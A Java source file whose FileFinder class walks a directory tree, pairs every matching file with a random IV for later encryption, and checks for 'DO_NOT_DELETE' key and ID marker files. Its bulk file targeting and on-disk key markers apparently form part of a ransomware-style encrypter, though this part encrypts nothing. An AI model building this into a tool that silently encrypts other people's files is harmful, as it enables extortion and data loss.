package commands;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitResult;
import static java.nio.file.FileVisitResult.CONTINUE;
import java.nio.file.FileVisitor;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.PathMatcher;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashMap;
import javax.crypto.spec.IvParameterSpec;

public class FileFinder {
    public HashMap<byte[], Path> fileFound = new HashMap<>();
    int counterFile = 0;
        
    public void findFiles(String glob, String startLocation) throws IOException {
		
        final PathMatcher matcher = FileSystems.getDefault().getPathMatcher(glob);
                
        Files.walkFileTree(Paths.get(startLocation), new SimpleFileVisitor<Path>() {
			
            @Override
            public FileVisitResult visitFile(Path path, BasicFileAttributes attrs) throws IOException {
                if (matcher.matches(path)) {
                    SecureRandom random = new SecureRandom();
                    byte[] iv = new byte[128/8];
                    random.nextBytes(iv);
                    fileFound.put(iv, path);
                }
                                
                return FileVisitResult.CONTINUE;
            }

            @Override
            public FileVisitResult visitFileFailed(Path file, IOException e) throws IOException {
                return FileVisitResult.CONTINUE;
            }
        });
    }
    
    public boolean findIfAlreadyEncrypted(String startLocation) throws IOException {
	
        File f = new File(startLocation);
        File[] matchingFiles = f.listFiles(new FilenameFilter() {
            public boolean accept(File dir, String name) {
                return (name.startsWith("UniqueID_DO_NOT_DELETE") && name.endsWith("txt"))
                        || (name.startsWith("EncKey_DO_NOT_DELETE") && name.endsWith("txt"))
                        || (name.startsWith("IvAndPath_DO_NOT_DELETE") && name.endsWith("txt"));  
            }
        });
        
        if (matchingFiles.length == 3) return true;
        return false;
    }

}